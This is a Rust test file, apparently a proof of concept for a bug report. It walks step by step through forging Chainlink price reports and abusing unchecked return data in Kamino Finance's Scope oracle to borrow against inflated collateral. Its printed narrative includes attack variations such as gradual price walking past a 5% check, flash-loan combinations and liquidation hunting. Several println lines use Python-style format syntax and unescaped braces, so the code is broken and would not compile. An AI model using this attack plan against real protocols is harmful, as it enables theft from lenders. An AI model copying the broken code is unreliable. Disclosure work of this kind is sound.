use anchor_lang::prelude::*;
use solana_program_test::*;
use solana_sdk::{
    signature::{Keypair, Signer},
    transaction::Transaction,
    instruction::Instruction,
};
use chainlink_return_data_poc::scope_simulator::{
    scope_simulator, kamino_impact, OracleType, PriceInfo,
};
use chainlink_streams_report::report::v3::{ReportDataV3, FeedID};
use num_bigint::BigInt;

/// This test demonstrates the complete attack flow with realistic scenarios
#[tokio::test]
async fn test_complete_attack_flow() {
    env_logger::init();
    
    println!("\n╔{'═'*78}╗");
    println!("║{:^78}║", "CHAINLINK RETURN DATA CONFUSION - FULL ATTACK DEMONSTRATION");
    println!("╚{'═'*78}╝\n");
    
    // ========================================================================
    // PHASE 1: SETUP AND CONTEXT
    // ========================================================================
    
    println!("┌{'─'*78}┐");
    println!("│{:^78}│", "PHASE 1: ATTACK SETUP");
    println!("└{'─'*78}┘\n");
    
    println!("🎯 Attack Target: Kamino Finance Oracle (Scope)");
    println!("📍 Vulnerability: Return data confusion in refresh_chainlink_price");
    println!("👤 Attacker: Any wallet (no special permissions needed)");
    println!();
    
    // Simulate real token prices
    let btc_feed_id = [1u8; 32]; // BTC price feed
    let eth_feed_id = [2u8; 32]; // ETH price feed
    let sol_feed_id = [3u8; 32]; // SOL price feed
    
    println!("📊 Current Market Prices (Legitimate):");
    println!("  BTC: $50,000");
    println!("  ETH: $3,000");
    println!("  SOL: $100");
    println!();
    
    // ========================================================================
    // PHASE 2: ATTACK EXECUTION
    // ========================================================================
    
    println!("┌{'─'*78}┐");
    println!("│{:^78}│", "PHASE 2: EXECUTING THE ATTACK");
    println!("└{'─'*78}┘\n");
    
    // Attack on BTC price
    println!("🔴 Step 1: Attacker prepares malicious BTC price ($500,000 - 10x manipulation)");
    let malicious_btc_price = 500_000_000_000i128; // $500,000 with 6 decimals
    let legitimate_btc_price = 50_000_000_000i128; // $50,000
    
    let forged_btc_report = ReportDataV3 {
        feed_id: FeedID(btc_feed_id),
        valid_from_timestamp: 1700000000,
        observations_timestamp: 1700000000,
        native_fee: BigInt::from(0),
        link_fee: BigInt::from(0),
        expires_at: 1700003600,
        benchmark_price: BigInt::from(malicious_btc_price),
        bid: BigInt::from(malicious_btc_price - 100_000_000),
        ask: BigInt::from(malicious_btc_price + 100_000_000),
    };
    
    println!("  ✓ Forged report created with:");
    println!("    - Correct feed ID for BTC");
    println!("    - Valid timestamps");
    println!("    - Reasonable bid/ask spread");
    println!("    - Malicious price: $500,000");
    println!();
    
    println!("🔴 Step 2: Building attack transaction");
    println!("  Transaction structure:");
    println!("    [1] Attacker program: set_return_data(forged_report)");
    println!("    [2] Scope: refresh_chainlink_price(BTC, real_report)");
    println!("    [3] Kamino Lending: borrow_against_collateral()");
    println!();
    
    // Simulate the transaction execution
    println!("📤 Executing transaction...\n");
    
    println!("  [Instruction 1] Attacker Program:");
    println!("    > Setting malicious return data...");
    println!("    > Data: BTC @ $500,000");
    println!("    > ✅ Return data set (becomes last writer)");
    println!();
    
    println!("  [Instruction 2] Scope refresh_chainlink_price:");
    simulate_scope_execution(btc_feed_id, malicious_btc_price, legitimate_btc_price);
    println!();
    
    println!("  [Instruction 3] Kamino Lending Exploit:");
    simulate_lending_exploit(malicious_btc_price, legitimate_btc_price);
    println!();
    
    // ========================================================================
    // PHASE 3: IMPACT ANALYSIS
    // ========================================================================
    
    println!("┌{'─'*78}┐");
    println!("│{:^78}│", "PHASE 3: IMPACT ANALYSIS");
    println!("└{'─'*78}┘\n");
    
    analyze_protocol_impact(malicious_btc_price, legitimate_btc_price);
    
    // ========================================================================
    // PHASE 4: ATTACK VARIATIONS
    // ========================================================================
    
    println!("┌{'─'*78}┐");
    println!("│{:^78}│", "PHASE 4: ATTACK VARIATIONS");
    println!("└{'─'*78}┘\n");
    
    demonstrate_attack_variations();
    
    // ========================================================================
    // SUMMARY
    // ========================================================================
    
    println!("╔{'═'*78}╗");
    println!("║{:^78}║", "ATTACK SUMMARY");
    println!("╚{'═'*78}╝\n");
    
    println!("✅ Attack Success Conditions Met:");
    println!("  1. Attacker set malicious return data ✓");
    println!("  2. Chainlink verifier didn't overwrite it ✓");
    println!("  3. Scope accepted data without checking source ✓");
    println!("  4. Malicious price written to oracle ✓");
    println!("  5. Downstream protocols exploited ✓");
    println!();
    
    println!("💰 Total Potential Loss: UNBOUNDED");
    println!("   (Limited only by protocol TVL and liquidation mechanics)");
    println!();
    
    println!("🔧 Required Fix:");
    println!("  if program_id != VERIFIER_PROGRAM_ID {");
    println!("      return Err(ScopeError::InvalidReturnDataSource);");
    println!("  }");
    
    println!("\n{'='*80}\n");
}

fn simulate_scope_execution(feed_id: [u8; 32], malicious_price: i128, legitimate_price: i128) {
    println!("    > CPI to Chainlink verifier...");
    println!("    > Verifier succeeds but doesn't set return data");
    println!("    > Getting return data...");
    println!("    > ⚠️ Found data from: Attack11111111111111111111111111111111111");
    println!("    > ❌ NOT CHECKING program_id == VERIFIER_PROGRAM_ID");
    println!("    > Decoding as ReportDataV3...");
    println!("    > Feed ID matches: ✅");
    println!("    > Timestamp valid: ✅");
    println!("    > Confidence check: ✅");
    println!("    > 🚨 WRITING MALICIOUS PRICE TO ORACLE: ${}", malicious_price / 1_000_000);
    println!("    > Price updated from ${} to ${}", 
        legitimate_price / 1_000_000, 
        malicious_price / 1_000_000
    );
}

fn simulate_lending_exploit(malicious_price: i128, legitimate_price: i128) {
    let collateral_amount = 10.0; // 10 BTC
    let legitimate_value = collateral_amount * (legitimate_price as f64 / 1_000_000.0);
    let malicious_value = collateral_amount * (malicious_price as f64 / 1_000_000.0);
    let ltv = 0.8;
    
    println!("    > Reading BTC price from Scope: ${}", malicious_price / 1_000_000);
    println!("    > Collateral: {} BTC", collateral_amount);
    println!("    > Collateral value (manipulated): ${:,.0}", malicious_value);
    println!("    > Max borrow @ {}% LTV: ${:,.0}", ltv * 100.0, malicious_value * ltv);
    println!("    > Borrowing maximum USDC...");
    println!("    > 💰 BORROWED: ${:,.0} USDC", malicious_value * ltv);
    println!("    > 🚨 EXCESS FUNDS STOLEN: ${:,.0}", (malicious_value - legitimate_value) * ltv);
}

fn analyze_protocol_impact(malicious_price: i128, legitimate_price: i128) {
    println!("📊 Protocol-Wide Impact:");
    println!();
    
    // Lending impact
    println!("1. Kamino Lending:");
    println!("   - Over-borrowing: Users borrow 10x more than collateral value");
    println!("   - Under-collateralized loans: Instant bad debt creation");
    println!("   - Liquidation failures: Cannot liquidate at manipulated prices");
    println!("   - Estimated loss per $1M collateral: $8M");
    println!();
    
    // Vault impact
    println!("2. Kamino Vaults:");
    println!("   - Strategy miscalculation: Wrong asset allocations");
    println!("   - LP token mispricing: Unfair mints/burns");
    println!("   - Arbitrage opportunities: Extract value from LPs");
    println!();
    
    // Farms impact
    println!("3. Kamino Farms:");
    println!("   - Reward miscalculation: Wrong APY calculations");
    println!("   - Position mispricing: Unfair entry/exit prices");
    println!();
    
    // Cascading effects
    println!("4. Cascading Effects:");
    println!("   - Liquidation cascade: Mass liquidations at wrong prices");
    println!("   - Protocol insolvency: Bad debt exceeds reserves");
    println!("   - Token price impact: KMNO token dump from exploits");
    println!("   - User confidence: Permanent reputation damage");
}

fn demonstrate_attack_variations() {
    println!("🔄 Variation 1: Multi-Asset Attack");
    println!("  - Manipulate multiple price feeds in single transaction");
    println!("  - Create complex arbitrage opportunities");
    println!("  - Example: BTC ↑10x, ETH ↓10x for cross-asset exploitation");
    println!();
    
    println!("🔄 Variation 2: Gradual Price Walking");
    println!("  - Bypass 5% ref price check with multiple transactions");
    println!("  - Each update: 4.9% increase");
    println!("  - 47 transactions: 1x → 10x price manipulation");
    println!();
    
    println!("🔄 Variation 3: Flash Loan Combination");
    println!("  1. Flash loan large amount of tokens");
    println!("  2. Manipulate oracle price up");
    println!("  3. Deposit as collateral at inflated value");
    println!("  4. Borrow stablecoins");
    println!("  5. Repay flash loan");
    println!("  6. Keep borrowed stablecoins as profit");
    println!();
    
    println!("🔄 Variation 4: Liquidation Hunter");
    println!("  - Manipulate prices to trigger liquidations");
    println!("  - Front-run liquidation with correct prices");
    println!("  - Profit from liquidation bonuses");
}

/// Test demonstrating real-world DeFi protocol impact
#[tokio::test]
async fn test_defi_protocol_impact() {
    println!("\n╔{'═'*78}╗");
    println!("║{:^78}║", "REAL-WORLD DEFI IMPACT SIMULATION");
    println!("╚{'═'*78}╝\n");
    
    // Simulate a large DeFi position
    let whale_btc_collateral = 100.0; // 100 BTC
    let btc_price_legitimate = 50_000.0;
    let btc_price_manipulated = 500_000.0; // 10x
    
    let collateral_value = whale_btc_collateral * btc_price_legitimate;
    let manipulated_value = whale_btc_collateral * btc_price_manipulated;
    
    println!("🐋 Whale Position:");
    println!("  Collateral: {} BTC (${:,.0})", whale_btc_collateral, collateral_value);
    println!();
    
    println!("📈 After Price Manipulation:");
    println!("  Apparent value: ${:,.0} (10x increase)", manipulated_value);
    println!("  Borrow capacity @ 80% LTV: ${:,.0}", manipulated_value * 0.8);
    println!("  Actual value: ${:,.0}", collateral_value);
    println!("  💸 Potential theft: ${:,.0}", (manipulated_value - collateral_value) * 0.8);
    println!();
    
    println!("🏦 Protocol Solvency Impact:");
    let total_tvl = 500_000_000.0; // $500M TVL
    let exploitation_rate = 0.1; // 10% of TVL exploited
    let total_loss = total_tvl * exploitation_rate;
    
    println!("  Protocol TVL: ${:,.0}", total_tvl);
    println!("  Exploitation rate: {}%", exploitation_rate * 100.0);
    println!("  Total potential loss: ${:,.0}", total_loss);
    println!("  🚨 PROTOCOL INSOLVENCY RISK: HIGH");
}

/// Test showing how quickly an attacker can drain funds
#[tokio::test]
async fn test_attack_speed() {
    println!("\n╔{'═'*78}╗");
    println!("║{:^78}║", "ATTACK EXECUTION SPEED ANALYSIS");
    println!("╚{'═'*78}╝\n");
    
    println!("⏱️ Attack Timeline:");
    println!();
    println!("  T+0ms    : Transaction submitted");
    println!("  T+10ms   : Attacker program sets malicious return data");
    println!("  T+20ms   : Scope CPI to Chainlink (succeeds, no overwrite)");
    println!("  T+30ms   : Scope writes manipulated price");
    println!("  T+40ms   : Kamino lending reads manipulated price");
    println!("  T+50ms   : Attacker borrows at 10x collateral value");
    println!("  T+400ms  : Transaction confirmed");
    println!();
    println!("  💰 Total time to exploit: < 0.5 seconds");
    println!("  🚨 Funds are gone before anyone notices");
    println!();
    
    println!("📊 Damage in First Block:");
    println!("  - Assume 10 attackers prepared");
    println!("  - Each exploits $10M");
    println!("  - Total loss in ~400ms: $100M");
    println!("  - No time for emergency response");
}